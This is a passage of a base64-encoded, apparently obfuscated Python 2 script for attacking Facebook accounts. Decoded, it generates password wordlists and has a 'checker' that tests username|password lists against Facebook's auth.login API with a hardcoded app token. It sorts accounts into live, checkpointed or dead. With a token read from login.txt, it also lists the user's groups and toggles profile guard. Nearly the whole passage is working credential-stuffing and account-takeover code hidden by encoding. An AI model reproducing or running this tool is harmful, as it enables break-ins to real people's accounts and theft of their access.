LGgsZixoLGcsaCxoLGgsZyxmLGEsZyxoLGIsZixnLGIsZyxoLGMsZixnLGMsZyxoLGQsZixnLGQsZyxoLGEsaSxhLGosYSxrLGksZSxpLGosaSxrLGIsaSxiLGosYixrLGMsaSxjLGosYyxrLGUsayxqLGEsaixiLGosYyxqLGQsaixqLGssYSxrLGIsayxjLGssZCxrLGssaSxsLGksbSxpLG4saixsLGosbSxqLG4saixrKSkNCgkJd2cgPSAwDQoJCXdoaWxlICh3ZyA8IDEwMCk6DQoJCQl3ZyA9IHdnICsgMQ0KCQkJZmlsZS53cml0ZShhICsgc3RyKHdnKSArICdcbicpDQoJCWVuID0gMA0KCQl3aGlsZSAoZW4gPCAxMDApOg0KCQkJZW4gPSBlbiArIDENCgkJCWZpbGUud3JpdGUoaSArIHN0cihlbikgKyAnXG4nKQ0KCQl3b3JkID0gMA0KCQl3aGlsZSAod29yZCA8IDEwMCk6DQoJCQl3b3JkID0gd29yZCArIDENCgkJCWZpbGUud3JpdGUoZCArIHN0cih3b3JkKSArICdcbicpDQoJCWdlbiA9IDANCgkJd2hpbGUgKGdlbiA8IDEwMCk6DQoJCQlnZW4gPSBnZW4gKyAxDQoJCQlmaWxlLndyaXRlKGogKyBzdHIoZ2VuKSArICdcbicpDQoJCWZpbGUuY2xvc2UoKQ0KCQl0aW1lLnNsZWVwKDEuNSkNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50ICgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSAlcy50eHQiICVhKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlmdW5jKCkNCglleGNlcHQgSU9FcnJvciwgZToNCgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gRmFpbGVkIikNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZnVuYygpDQoNCiMjIyMjIENIRUNLRVIgIyMjIyMNCmRlZiBjaGVja19ha3VuKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUNyZWF0ZSBpbiBmaWxlXDAzM1sxOzkxbSA6IFwwMzNbMTs5N211c2VybmFtZXxwYXNzd29yZCINCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglsaXZlID0gW10NCgljaGVja19pdCA9IFtdDQoJZGllID0gW10NCgl0cnk6DQoJCWZpbGUgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgcGF0aCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikNCgkJbGlzdCA9IG9wZW4oZmlsZSwncicpLnJlYWRsaW5lcygpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50ICgiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCIpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWZ1bmMoKQ0KCXBlbWlzYWggPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNlcGFyYXRvciBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikNCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglmb3IgbWVraSBpbiBsaXN0Og0KCQl1c2VybmFtZSwgcGFzc3dvcmQgPSAobWVraS5zdHJpcCgpKS5zcGxpdChzdHIocGVtaXNhaCkpDQoJCXVybCA9ICJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcm5hbWUpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3N3b3JkKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2Ig0KCQlkYXRhID0gcmVxdWVzdHMuZ2V0KHVybCkNCgkJbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQ0KCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOg0KCQkJbGl2ZS5hcHBlbmQocGFzc3dvcmQpDQoJCQlwcmludCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtTGl2ZVwwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQNCgkJZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06DQoJCQljaGVja19pdC5hcHBlbmQocGFzc3dvcmQpDQoJCQlwcmludCJcMDMzWzE7OTdtWyBcMDMzWzE7OTNtQ2hlY2tcMDMzWzE7OTdtIF0gXDAzM1sxOzk3bSIrdXNlcm5hbWUrInwiK3Bhc3N3b3JkDQoJCWVsc2U6DQoJCQlkaWUuYXBwZW5kKHBhc3N3b3JkKQ0KCQkJcHJpbnQiXDAzM1sxOzk3bVsgXDAzM1sxOzkxbURpZVwwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQNCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbFwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtTGl2ZT1cMDMzWzE7OTJtIitzdHIobGVuKGxpdmUpKSsiIFwwMzNbMTs5N21DaGVjaz1cMDMzWzE7OTNtIitzdHIobGVuKGNoZWNrX2l0KSkrIiBcMDMzWzE7OTdtRGllPVwwMzNbMTs5MW0iK3N0cihsZW4oZGllKSkNCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCWZ1bmMoKQ0KDQojIyMjIyBncm91cCBTQVlBICMjIyMjDQpkZWYgZ3JvdXBfbGlzdCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvcy5ta2Rpcignb3V0JykNCglleGNlcHQgT1NFcnJvcjoNCgkJcGFzcw0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCgl0cnk6DQoJCXVoID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9ncm91cHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCWdvb2QgPSBqc29uLmxvYWRzKHVoLnRleHQpDQoJCWZvciBwIGluIGdvb2RbJ2RhdGEnXToNCgkJCWZiX25hbWUgPSBwWyJuYW1lIl0NCgkJCWlkID0gcFsiaWQiXQ0KCQkJZj1vcGVuKCdvdXQvZ3JvdXBpZC50eHQnLCd3JykNCgkJCWxpc3Rncm91cC5hcHBlbmQoaWQpDQoJCQlmLndyaXRlKGlkICsgJ1xuJykNCgkJCXByaW50ICJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtTXlHcm91cFwwMzNbMTs5N20gXSAiK3N0cihpZCkrIiA9PiAiK3N0cihmYl9uYW1lKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgR3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICVzIiUobGVuKGxpc3Rncm91cCkpDQoJCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0L2dyb3VwaWQudHh0IikNCgkJZi5jbG9zZSgpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWZ1bmMoKQ0KCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZnVuYygpDQoJZXhjZXB0IEtleUVycm9yOg0KCQlvcy5yZW1vdmUoJ291dC9ncm91cGlkLnR4dCcpDQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWZ1bmMoKQ0KCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIENvbm5lY3Rpb24iDQoJCWV4aXQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBFcnJvciINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZnVuYygpDQoNCiMjIyMjIFBST0ZJTEUgR1VBUkQgIyMjIyMNCmRlZiBndWFyZCgpOg0KCWdsb2JhbCBmYl90b2tlbg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEFjdGl2YXRlIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIE5vdCBhY3RpdmF0ZSINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIg0KCXByaW50ICLilZEiDQoJZyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQ0KCWlmIGcgPT0gIjEiOg0KCQlhY3RpdmF0ZWQgPSAidHJ1ZSINCgkJamF5KGZiX3Rva2VuLCBhY3RpdmF0ZWQpDQoJZWxpZiBnID09ICIyIjoNCgkJbm90X2FjdGl2ZSA9ICJmYWxzZSINCgkJamF5KGZiX3Rva2VuLCBub3RfYWN0aXZlKQ0KCWVsaWYgZyA9PSIwIjoNCgkJZnVuYygpDQoJZWxpZiBnID09IiI6DQoJCWV4aXQoKQ0KCWVsc2U6DQoJCWV4aXQoKQ0KDQpkZWYgZ2V0X3VzZXJpZChmYl90b2tlbik6DQoJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0lcyIlZmJfdG9rZW4NCglyZXMgPSByZXF1ZXN0cy5nZXQodXJsKQ0KCXVpZCA9IGpzb24ubG9hZHMocmVzLnRleHQpDQoJcmV0dXJuIHVpZFsiaWQiXQ0KDQpkZWYgamF5KGZiX3Rva2VuLCBlbmFibGUgPSBUcnVlKToNCglpZCA9IGdldF91c2VyaWQoZmJfdG9rZW4pDQoJZGF0YSA9ICd2YXJpYWJsZXM9eyIwIjp7ImlzX3NoaWVsZGVkIjogJXMsInNlc3Npb25faWQiOiI5Yjc4MTkxYy04NGZkLTRhYjYtYjBhYS0xOWIzOWYwNGE2YmMiLCJhY3Rvcl9pZCI6IiVzIiwiY2xpZW50X211dGF0aW9uX2lkIjoiYjAzMTZkZDYtM2ZkNi00YmViLWFlZDQtYmIyOWM1ZGM2NGIwIn19Jm1ldGhvZD1wb3N0JmRvY19pZD0xNDc3MDQzMjkyMzY3MTgzJnF1ZXJ5X25hbWU9SXNTaGllbGRlZFNldE11dGF0aW9uJnN0cmlwX2RlZmF1bHRzPXRydWUmc3RyaXBfbnVsbHM9dHJ1ZSZsb2NhbGU9ZW5fVVMmY2xpZW50X2NvdW50cnlfY29kZT1VUyZmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWU9SXNTaGllbGRlZFNldE11dGF0aW9uJmZiX2FwaV9jYWxsZXJfY2xhc3M9SXNTaGllbGRlZFNldE11dGF0aW9uJyAlIChlbmFibGUsIHN0cihpZCkpDQoJaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAiQXV0aG9yaXphdGlvbiIgOiAiT0F1dGggJXMiICUgZmJfdG9rZW59DQoJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyYXBocWwiDQoJcmVzID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGEgPSBkYXRhLCBoZWFkZXJzID0gaGVhZGVycykNCglwcmludChyZXMudGV4dCkNCglpZiAnImlzX3NoaWVsZGVkIjp0cnVlJyBpbiByZXMudGV4dDoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUFjdGl2YXRlIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlmdW5jKCkNCgllbGlmICciaXNfc2hpZWxkZWQiOmZhbHNlJyBpbiByZXMudGV4dDoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkxbU5vdCBhY3RpdmF0ZSINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZnVuYygpDQoJZWxzZToNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gRXJyb3IiDQoJCWV4aXQoKQ0KDQppZiBfX25hbWVfXz09J19fbWFpbl9fJzoNCiAgICAgICAgdG9vbF9tYWluX2Z1bmN0aW9uKCkNCg=='))
